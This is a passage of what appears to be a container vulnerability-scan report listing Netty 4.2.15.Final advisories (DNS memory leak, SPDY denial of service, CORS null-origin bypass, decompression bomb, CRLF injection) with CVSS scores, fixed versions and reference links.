                        │      │                  │        │            VI:N/VA:H/SC:N/SI:N/SA:N 
                        │      │                  │        ╰ V40Score : 8.7 
                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
                        │      │                           │           /A:H 
                        │      │                           ╰ V3Score : 7.5 
                        │      ╰ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-59901 
                        │                         ├ [1]: https://github.com/netty/netty 
                        │                         ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.1.
                        │                         │      136.Final 
                        │                         ├ [3]: https://github.com/netty/netty/releases/tag/netty-4.2.
                        │                         │      16.Final 
                        │                         ├ [4]: https://github.com/netty/netty/security/advisories/GHS
                        │                         │      A-558v-64gr-wgg4 
                        │                         ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-59901 
                        │                         ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-59901 
                        ├ [4]  ╭ VulnerabilityID : GHSA-mfg7-5gfp-c4w3 
                        │      ├ PkgName         : io.netty:netty-codec-dns 
                        │      ├ PkgPath         : openaf/Kube/netty-codec-dns-4.2.15.Final.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-dns@4.2.15.Final 
                        │      │                  ╰ UID : 59966438c02b5bf8 
                        │      ├ InstalledVersion: 4.2.15.Final 
                        │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:b56b1740507a3573c47aa19399fc8c140d8af1c78c89
                        │      │                  │         6fcd143a3c4b92a52b66 
                        │      │                  ╰ DiffID: sha256:7a79226c6a40e2b31852468e4ec7a9289271678303c2
                        │      │                            2092636c1395e68b9953 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://github.com/advisories/GHSA-mfg7-5gfp-c4w3 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:549200fc15e1262505e9158a4038d039462dd37d27bbd2f573024
                        │      │                   ede9e444080 
                        │      ├ Title           : Netty: Memory Leak in DNS Record Decoder via Malformed
                        │      │                   Domain Names 
                        │      ├ Description     : ### Summary
                        │      │                   A memory leak can be caused in Netty's DNS codec by sending
                        │      │                   malicious DNS packets containing invalid domain names.
                        │      │                   Because the leak occurs incrementally per packet, sustained
                        │      │                   malicious requests will cause a gradual Denial of Service.
                        │      │                   
                        │      │                   ### Details
                        │      │                   Inside `io.netty.handler.codec.dns.AbstractDnsRecord`, the
                        │      │                   parsed domain name string is passed to `IDN.toASCII(name)`.
                        │      │                   If the domain name contains characters that violate IDNA
                        │      │                   rules, `IDN.toASCII` throws an `IllegalArgumentException`.
                        │      │                   Because this exception occurs inside the constructor before
                        │      │                   the `DnsRecord` instance can assign the buffer to its
                        │      │                   content field for later release, the ByteBuf whose reference
                        │      │                    count was incremented (or newly allocated) is never
                        │      │                   released, resulting in a direct memory leak.
                        │      │                   There are several places where variants of this leak
                        │      │                   happen:
                        │      │                   -
                        │      │                   `io.netty.handler.codec.dns.DefaultDnsRecordDecoder#decodeRe
                        │      │                   cord(java.lang.String,
                        │      │                   io.netty.handler.codec.dns.DnsRecordType, int, long,
                        │      │                   io.netty.buffer.ByteBuf, int, int)` invokes
                        │      │                   `in.retainedDuplicate()` or creates a new buffer `out` when
                        │      │                   constructing `DefaultDnsRawRecord`
                        │      │                   `io.netty.handler.codec.dns.DnsCodecUtil#decompressDomainNam
                        │      │                   e` allocates a new `ByteBuf` and passes it to
                        │      │                   `encodeDomainName()`. If the decompressed domain name
                        │      │                   contains a null byte (`\0`), `encodeDomainName()` throws an
                        │      │                   `IllegalArgumentException`, leaking the newly allocated
                        │      │                   buffer.
                        │      │                   ### Impact
                        │      │                   Resource Exhaustion. Any application utilizing Netty's
                        │      │                   DnsRecordDecoder (such as DnsNameResolver or custom DNS
                        │      │                   servers) is vulnerable. 
                        │      ├ Severity        : MEDIUM 
                        │      ├ VendorSeverity   ─ ghsa: 2 
                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L 
                        │      │                         ╰ V3Score : 5.3 
                        │      ├ References       ╭ [0]: https://github.com/netty/netty 
                        │      │                  ├ [1]: https://github.com/netty/netty/commit/5b68c61f37aa4a30
                        │      │                  │      45cba624cbea239655c9003b 
                        │      │                  ├ [2]: https://github.com/netty/netty/commit/bb2ff68a1fb71cb4
                        │      │                  │      b0eb9a9e17b66c52aff680c6 
                        │      │                  ├ [3]: https://github.com/netty/netty/pull/17063 
                        │      │                  ├ [4]: https://github.com/netty/netty/pull/17065 
                        │      │                  ├ [5]: https://github.com/netty/netty/releases/tag/netty-4.1.
                        │      │                  │      136.Final 
                        │      │                  ├ [6]: https://github.com/netty/netty/releases/tag/netty-4.2.
                        │      │                  │      16.Final 
                        │      │                  ╰ [7]: https://github.com/netty/netty/security/advisories/GHS
                        │      │                         A-mfg7-5gfp-c4w3 
                        │      ├ PublishedDate   : 2026-07-24T16:52:50Z 
                        │      ╰ LastModifiedDate: 2026-07-24T16:52:50Z 
                        ├ [5]  ╭ VulnerabilityID : CVE-2026-55831 
                        │      ├ VendorIDs        ─ [0]: GHSA-6jqx-86gh-f27w 
                        │      ├ PkgName         : io.netty:netty-codec-http 
                        │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.15.Final 
                        │      │                  ╰ UID : 3fc77ba685baead2 
                        │      ├ InstalledVersion: 4.2.15.Final 
                        │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:b56b1740507a3573c47aa19399fc8c140d8af1c78c89
                        │      │                  │         6fcd143a3c4b92a52b66 
                        │      │                  ╰ DiffID: sha256:7a79226c6a40e2b31852468e4ec7a9289271678303c2
                        │      │                            2092636c1395e68b9953 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-55831 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:1bac789759824acb6ecc6612434137fa4657e769114c434528f8b
                        │      │                   5ed1d95a321 
                        │      ├ Title           : io.netty/netty-codec-http: Netty: Denial of Service via SPDY
                        │      │                    SETTINGS frame processing 
                        │      ├ Description     : Netty is a network application framework for development of
                        │      │                   protocol servers and clients. Prior to 4.1.136.Final and
                        │      │                   4.2.16.Final, Netty's SPDY SETTINGS decoder accepts a
                        │      │                   peer-declared SETTINGS entry count up to the 24-bit
                        │      │                   frame-length limit and materializes every unique setting ID
                        │      │                   in `DefaultSpdySettingsFrame`, allowing a remote SPDY/3.1
                        │      │                   peer to send a syntactically valid roughly 2 MiB SETTINGS
                        │      │                   frame that creates 262144 map entries and amplifies network
                        │      │                   input into heap growth and ordered-map insertion work. This
                        │      │                   issue is fixed in versions 4.1.136.Final and 4.2.16.Final.[
                        │      │                   m 
                        │      ├ Severity        : HIGH 
                        │      ├ CweIDs           ╭ [0]: CWE-400 
                        │      │                  ╰ [1]: CWE-770 
                        │      ├ VendorSeverity   ╭ ghsa  : 3 
                        │      │                  ╰ redhat: 3 
                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
                        │      │                  │        │           /A:H 
                        │      │                  │        ╰ V3Score : 7.5 
                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
                        │      │                           │           /A:H 
                        │      │                           ╰ V3Score : 7.5 
                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-55831 
                        │      │                  ├ [1]: https://github.com/netty/netty 
                        │      │                  ├ [2]: https://github.com/netty/netty/commit/5b68c61f37aa4a30
                        │      │                  │      45cba624cbea239655c9003b 
                        │      │                  ├ [3]: https://github.com/netty/netty/commit/bb2ff68a1fb71cb4
                        │      │                  │      b0eb9a9e17b66c52aff680c6 
                        │      │                  ├ [4]: https://github.com/netty/netty/releases/tag/netty-4.1.
                        │      │                  │      136.Final 
                        │      │                  ├ [5]: https://github.com/netty/netty/releases/tag/netty-4.2.
                        │      │                  │      16.Final 
                        │      │                  ├ [6]: https://github.com/netty/netty/security/advisories/GHS
                        │      │                  │      A-6jqx-86gh-f27w 
                        │      │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-55831 
                        │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-55831 
                        │      ├ PublishedDate   : 2026-07-21T00:17:35.383Z 
                        │      ╰ LastModifiedDate: 2026-07-23T15:17:16.78Z 
                        ├ [6]  ╭ VulnerabilityID : CVE-2026-55833 
                        │      ├ VendorIDs        ─ [0]: GHSA-mvh2-crg5-v77c 
                        │      ├ PkgName         : io.netty:netty-codec-http 
                        │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.15.Final 
                        │      │                  ╰ UID : 3fc77ba685baead2 
                        │      ├ InstalledVersion: 4.2.15.Final 
                        │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:b56b1740507a3573c47aa19399fc8c140d8af1c78c89
                        │      │                  │         6fcd143a3c4b92a52b66 
                        │      │                  ╰ DiffID: sha256:7a79226c6a40e2b31852468e4ec7a9289271678303c2
                        │      │                            2092636c1395e68b9953 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-55833 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:b5832547481f285af4f8b3cc77ece87fcb51fa79bc8aab783eae1
                        │      │                   cc426a86cec 
                        │      ├ Title           : netty: io.netty/netty-codec-http: Netty: Denial of Service
                        │      │                   via SPDY header decompression amplification 
                        │      ├ Description     : Netty is a network application framework for development of
                        │      │                   protocol servers and clients. Prior to 4.1.136.Final and
                        │      │                   4.2.16.Final, Netty SPDY header decoding continues inflating
                        │      │                    zlib-compressed header blocks after the raw header parser
                        │      │                   has exceeded `maxHeaderSize` and marked the frame truncated
                        │      │                   in `SpdyFrameCodec`, allowing a remote peer to send a small
                        │      │                   compressed `HEADERS` block that expands into much larger raw
                        │      │                    header data and causes compression-amplified CPU and
                        │      │                   allocation churn. This issue is fixed in versions
                        │      │                   4.1.136.Final and 4.2.16.Final. 
                        │      ├ Severity        : HIGH 
                        │      ├ CweIDs           ─ [0]: CWE-400 
                        │      ├ VendorSeverity   ╭ ghsa  : 3 
                        │      │                  ╰ redhat: 3 
                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
                        │      │                  │        │           /A:H 
                        │      │                  │        ╰ V3Score : 7.5 
                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
                        │      │                           │           /A:H 
                        │      │                           ╰ V3Score : 7.5 
                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-55833 
                        │      │                  ├ [1]: https://github.com/netty/netty 
                        │      │                  ├ [2]: https://github.com/netty/netty/commit/5b68c61f37aa4a30
                        │      │                  │      45cba624cbea239655c9003b 
                        │      │                  ├ [3]: https://github.com/netty/netty/commit/bb2ff68a1fb71cb4
                        │      │                  │      b0eb9a9e17b66c52aff680c6 
                        │      │                  ├ [4]: https://github.com/netty/netty/releases/tag/netty-4.1.
                        │      │                  │      136.Final 
                        │      │                  ├ [5]: https://github.com/netty/netty/releases/tag/netty-4.2.
                        │      │                  │      16.Final 
                        │      │                  ├ [6]: https://github.com/netty/netty/security/advisories/GHS
                        │      │                  │      A-mvh2-crg5-v77c 
                        │      │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-55833 
                        │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-55833 
                        │      ├ PublishedDate   : 2026-07-21T00:17:35.537Z 
                        │      ╰ LastModifiedDate: 2026-07-23T13:34:45.383Z 
                        ├ [7]  ╭ VulnerabilityID : CVE-2026-56745 
                        │      ├ VendorIDs        ─ [0]: GHSA-jppx-w49h-x2qq 
                        │      ├ PkgName         : io.netty:netty-codec-http 
                        │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.15.Final 
                        │      │                  ╰ UID : 3fc77ba685baead2 
                        │      ├ InstalledVersion: 4.2.15.Final 
                        │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:b56b1740507a3573c47aa19399fc8c140d8af1c78c89
                        │      │                  │         6fcd143a3c4b92a52b66 
                        │      │                  ╰ DiffID: sha256:7a79226c6a40e2b31852468e4ec7a9289271678303c2
                        │      │                            2092636c1395e68b9953 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56745 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:7cea1da414d1d40da0b2af5f04405ec1d76f9fe91d8ce84ff9b9a
                        │      │                   ae98c469f04 
                        │      ├ Title           : netty: io.netty/netty-codec-http: Netty: Denial of Service
                        │      │                   via memory exhaustion in SPDY-to-HTTP codec 
                        │      ├ Description     : Netty is a network application framework for development of
                        │      │                   protocol servers and clients. In versions 4.2.0.Final
                        │      │                   through 4.2.15.Final and 4.1.0.Final through 4.1.135.Final,
                        │      │                   the `SpdyHttpDecoder` handler in Netty's SPDY-to-HTTP codec
                        │      │                   allocates a pooled `ByteBuf` when processing a
                        │      │                   client-initiated `SYN_STREAM` frame with `FLAG_FIN=0` and
                        │      │                   stores the partially constructed `FullHttpRequest` in
                        │      │                   `messageMap`; when the remote peer sends `RST_STREAM` for
                        │      │                   that stream or the accumulated content exceeds
                        │      │                   `maxContentLength`, the decoder removes the entry but does
                        │      │                   not release the pooled `ByteBuf`, causing native memory
                        │      │                   exhaustion. This issue is fixed in versions 4.1.136.Final
                        │      │                   and 4.2.16.Final. 
                        │      ├ Severity        : HIGH 
                        │      ├ CweIDs           ─ [0]: CWE-400 
                        │      ├ VendorSeverity   ╭ ghsa  : 3 
                        │      │                  ╰ redhat: 3 
                        │      ├ CVSS             ╭ ghsa   ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/
                        │      │                  │        │            VI:N/VA:H/SC:N/SI:N/SA:N 
                        │      │                  │        ╰ V40Score : 8.7 
                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
                        │      │                           │           /A:H 
                        │      │                           ╰ V3Score : 7.5 
                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-56745 
                        │      │                  ├ [1]: https://github.com/netty/netty 
                        │      │                  ├ [2]: https://github.com/netty/netty/commit/5b68c61f37aa4a30
                        │      │                  │      45cba624cbea239655c9003b 
                        │      │                  ├ [3]: https://github.com/netty/netty/commit/bb2ff68a1fb71cb4
                        │      │                  │      b0eb9a9e17b66c52aff680c6 
                        │      │                  ├ [4]: https://github.com/netty/netty/releases/tag/netty-4.1.
                        │      │                  │      136.Final 
                        │      │                  ├ [5]: https://github.com/netty/netty/releases/tag/netty-4.2.
                        │      │                  │      16.Final 
                        │      │                  ├ [6]: https://github.com/netty/netty/security/advisories/GHS
                        │      │                  │      A-jppx-w49h-x2qq 
                        │      │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2026-56745 
                        │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-56745 
                        │      ├ PublishedDate   : 2026-07-21T22:17:14.5Z 
                        │      ╰ LastModifiedDate: 2026-07-22T20:35:40.827Z 
                        ├ [8]  ╭ VulnerabilityID : CVE-2026-56746 
                        │      ├ VendorIDs        ─ [0]: GHSA-6cqp-g7gg-8hr5 
                        │      ├ PkgName         : io.netty:netty-codec-http 
                        │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.15.Final 
                        │      │                  ╰ UID : 3fc77ba685baead2 
                        │      ├ InstalledVersion: 4.2.15.Final 
                        │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:b56b1740507a3573c47aa19399fc8c140d8af1c78c89
                        │      │                  │         6fcd143a3c4b92a52b66 
                        │      │                  ╰ DiffID: sha256:7a79226c6a40e2b31852468e4ec7a9289271678303c2
                        │      │                            2092636c1395e68b9953 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56746 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:c68e7991fced82238b5547241ba7ae2e20d8ac62048fc4f3e58ec
                        │      │                   abf9fa0ec85 
                        │      ├ Title           : io.netty/netty-codec-http: Netty: Security control bypass
                        │      │                   allows unauthorized requests via null origin header 
                        │      ├ Description     : Netty is a network application framework for development of
                        │      │                   protocol servers and clients. Versions 4.2.0.Final through
                        │      │                   4.2.15.Final and 4.1.0.Final through 4.1.135.Final, are
                        │      │                   vulnerable to security control bypass during the origin
                        │      │                   evaluation process. CorsHandler provides a shortCircuit()
                        │      │                   configuration designed to reject unauthorized cross-origin
                        │      │                   requests immediately, acting as a security control before
                        │      │                   requests reach the application. However, due to a logical
                        │      │                   operator error in the origin evaluation process, this
                        │      │                   protection can be entirely bypassed. An attacker can bypass
                        │      │                   the short-circuit mechanism by sending a request with an
                        │      │                   Origin: null header. This failure forwards unauthorized
                        │      │                   requests to the backend application, bypassing intended
                        │      │                   access controls. This issue is fixed in versions
                        │      │                   4.1.136.Final and 4.2.16.Final. 
                        │      ├ Severity        : MEDIUM 
                        │      ├ CweIDs           ─ [0]: CWE-284 
                        │      ├ VendorSeverity   ╭ ghsa  : 2 
                        │      │                  ╰ redhat: 3 
                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H
                        │      │                  │        │           /A:N 
                        │      │                  │        ╰ V3Score : 6.5 
                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H
                        │      │                           │           /A:N 
                        │      │                           ╰ V3Score : 7.5 
                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-56746 
                        │      │                  ├ [1]: https://github.com/netty/netty 
                        │      │                  ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.1.
                        │      │                  │      136.Final 
                        │      │                  ├ [3]: https://github.com/netty/netty/releases/tag/netty-4.2.
                        │      │                  │      16.Final 
                        │      │                  ├ [4]: https://github.com/netty/netty/security/advisories/GHS
                        │      │                  │      A-6cqp-g7gg-8hr5 
                        │      │                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-56746 
                        │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-56746 
                        │      ├ PublishedDate   : 2026-07-21T22:17:14.667Z 
                        │      ╰ LastModifiedDate: 2026-07-22T20:35:40.827Z 
                        ├ [9]  ╭ VulnerabilityID : CVE-2026-59898 
                        │      ├ VendorIDs        ─ [0]: GHSA-4mp9-239f-g9hg 
                        │      ├ PkgName         : io.netty:netty-codec-http 
                        │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.15.Final 
                        │      │                  ╰ UID : 3fc77ba685baead2 
                        │      ├ InstalledVersion: 4.2.15.Final 
                        │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:b56b1740507a3573c47aa19399fc8c140d8af1c78c89
                        │      │                  │         6fcd143a3c4b92a52b66 
                        │      │                  ╰ DiffID: sha256:7a79226c6a40e2b31852468e4ec7a9289271678303c2
                        │      │                            2092636c1395e68b9953 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59898 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:88fe5c7349f60bfa5d221f257e7cb1f249874426c2c1147f16c02
                        │      │                   78b032ccd93 
                        │      ├ Title           : io.netty/netty-codec-http: Netty: Protocol version confusion
                        │      │                    in netty-codec-http (WebSocket) 
                        │      ├ Description     : A flaw was found in netty-codec-http. The WebSocket
                        │      │                   handshaker in this component fails to properly validate
                        │      │                   protocol version information during the WebSocket upgrade
                        │      │                   process. A remote attacker can exploit this vulnerability by
                        │      │                    manipulating the WebSocket handshake, leading to a bypass
                        │      │                   of security checks or the negotiation of unexpected protocol
                        │      │                    versions. This could potentially enable protocol-level
                        │      │                   attacks. 
                        │      ├ Severity        : MEDIUM 
                        │      ├ VendorSeverity   ╭ ghsa  : 2 
                        │      │                  ╰ redhat: 2 
                        │      ├ CVSS             ╭ ghsa   ╭ V40Vector: CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/
                        │      │                  │        │            VI:N/VA:N/SC:L/SI:L/SA:N 
                        │      │                  │        ╰ V40Score : 6.3 
                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N
                        │      │                           │           /A:N 
                        │      │                           ╰ V3Score : 5.3 
                        │      ╰ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-59898 
                        │                         ├ [1]: https://github.com/netty/netty 
                        │                         ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.1.
                        │                         │      136.Final 
                        │                         ├ [3]: https://github.com/netty/netty/releases/tag/netty-4.2.
                        │                         │      16.Final 
                        │                         ├ [4]: https://github.com/netty/netty/security/advisories/GHS
                        │                         │      A-4mp9-239f-g9hg 
                        │                         ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-59898 
                        │                         ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-59898 
                        ├ [10] ╭ VulnerabilityID : CVE-2026-59899 
                        │      ├ VendorIDs        ─ [0]: GHSA-q4f6-jm68-57ww 
                        │      ├ PkgName         : io.netty:netty-codec-http 
                        │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.15.Final 
                        │      │                  ╰ UID : 3fc77ba685baead2 
                        │      ├ InstalledVersion: 4.2.15.Final 
                        │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:b56b1740507a3573c47aa19399fc8c140d8af1c78c89
                        │      │                  │         6fcd143a3c4b92a52b66 
                        │      │                  ╰ DiffID: sha256:7a79226c6a40e2b31852468e4ec7a9289271678303c2
                        │      │                            2092636c1395e68b9953 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59899 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:9aaa5f423de059c1a3db976b4d6bb8094f2292925196bc6a8446f
                        │      │                   ae769d7b330 
                        │      ├ Title           : io.netty/netty-codec-http: Netty: Memory exhaustion in
                        │      │                   netty-codec-http (decompression bomb) 
                        │      ├ Description     : A flaw was found in the Netty netty-codec-http component. A
                        │      │                   remote attacker can send HTTP requests containing highly
                        │      │                   compressed data. The HTTP decoder in netty-codec-http fails
                        │      │                   to properly limit the decompression of this content, causing
                        │      │                    the system to consume excessive memory. This can lead to
                        │      │                   memory exhaustion and a denial of service (DoS), making the
                        │      │                   service unavailable to legitimate users. 
                        │      ├ Severity        : MEDIUM 
                        │      ├ VendorSeverity   ╭ ghsa  : 2 
                        │      │                  ╰ redhat: 3 
                        │      ├ CVSS             ╭ ghsa   ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/
                        │      │                  │        │            VI:N/VA:L/SC:N/SI:N/SA:N 
                        │      │                  │        ╰ V40Score : 6.9 
                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
                        │      │                           │           /A:H 
                        │      │                           ╰ V3Score : 7.5 
                        │      ╰ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-59899 
                        │                         ├ [1]: https://github.com/netty/netty 
                        │                         ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.1.
                        │                         │      136.Final 
                        │                         ├ [3]: https://github.com/netty/netty/releases/tag/netty-4.2.
                        │                         │      16.Final 
                        │                         ├ [4]: https://github.com/netty/netty/security/advisories/GHS
                        │                         │      A-q4f6-jm68-57ww 
                        │                         ├ [5]: https://netty.io/news/2026/07/09/4-1-136-Final.html 
                        │                         ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-59899 
                        │                         ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-59899 
                        ├ [11] ╭ VulnerabilityID : CVE-2026-59921 
                        │      ├ VendorIDs        ─ [0]: GHSA-gcjf-9mgh-3p7g 
                        │      ├ PkgName         : io.netty:netty-codec-http 
                        │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.15.Final 
                        │      │                  ╰ UID : 3fc77ba685baead2 
                        │      ├ InstalledVersion: 4.2.15.Final 
                        │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:b56b1740507a3573c47aa19399fc8c140d8af1c78c89
                        │      │                  │         6fcd143a3c4b92a52b66 
                        │      │                  ╰ DiffID: sha256:7a79226c6a40e2b31852468e4ec7a9289271678303c2
                        │      │                            2092636c1395e68b9953 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59921 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:0972b048d42d83e77c19d9bdcb2503953f550d63f01c876b5c9cd
                        │      │                   99f29ad18c4 
                        │      ├ Title           : io.netty/netty-codec-http: Netty: CRLF Injection via
                        │      │                   Multipart Filename in Netty HttpPostRequestEncoder 
                        │      ├ Description     : Netty is an asynchronous, event-driven network application
                        │      │                   framework. Prior to versions 4.1.136.Final and 4.2.16.Final,
                        │      │                    HttpPostRequestEncoder constructs multipart HTTP request
                        │      │                   bodies by directly concatenating user-supplied filenames and
                        │      │                    field names into Content-Disposition MIME headers without
                        │      │                   validating or sanitizing CRLF characters (\r\n). Since MIME
                        │      │                   headers are delimited by CRLF, an attacker who controls the
                        │      │                   filename can inject arbitrary MIME headers into the
                        │      │                   multipart body part. The root cause is that neither the
                        │      │                   encoder nor the FileUpload implementations' setFilename()
                        │      │                   methods, which only check for null, neutralize CRLF
                        │      │                   characters before the filename is embedded into the header.
                        │      │                   This issue has been fixed in versions 4.1.136.Final and
                        │      │                   4.2.16.Final. 
                        │      ├ Severity        : MEDIUM 
                        │      ├ CweIDs           ─ [0]: CWE-93 
                        │      ├ VendorSeverity   ╭ ghsa  : 2 
                        │      │                  ╰ redhat: 2 
                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:H
                        │      │                  │        │           /A:N 
                        │      │                  │        ╰ V3Score : 5.7 
                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:H
                        │      │                           │           /A:N 
                        │      │                           ╰ V3Score : 5.7 
